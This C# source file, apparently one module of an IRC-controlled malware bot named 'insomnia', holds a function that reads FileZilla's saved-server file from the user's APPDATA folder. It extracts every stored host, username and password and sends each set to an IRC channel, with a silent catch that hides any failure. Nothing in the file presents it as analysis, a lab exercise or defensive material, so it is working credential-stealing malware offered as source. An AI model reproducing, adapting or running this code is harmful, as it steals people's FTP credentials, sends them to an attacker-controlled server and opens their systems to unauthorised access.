using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.IO;
using System.Xml;

namespace insomnia
{
    internal class FTP
    {
        public static void GetFileZilla()
        {
            try
            {
                XmlDocument xml = new XmlDocument();

                string path = Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml";

                if (File.Exists(path))
                {
                    xml.Load(path);

                    XmlNodeList host = xml.GetElementsByTagName("Host");
                    XmlNodeList user = xml.GetElementsByTagName("User");
                    XmlNodeList password = xml.GetElementsByTagName("Pass");

                    for (int i = 0; i < host.Count; i++)
                    {
                        IRC.WriteMessage("FileZilla ->" + IRC.ColorCode(" " + host[i].InnerText) + " -" + IRC.ColorCode(" " + user[i].InnerText) + " :" + IRC.ColorCode(" " + password[i].InnerText), Config._mainChannel());
                        Thread.Sleep(100);
                    }
                }
            }
            catch
            {
            }
        }
    }
}
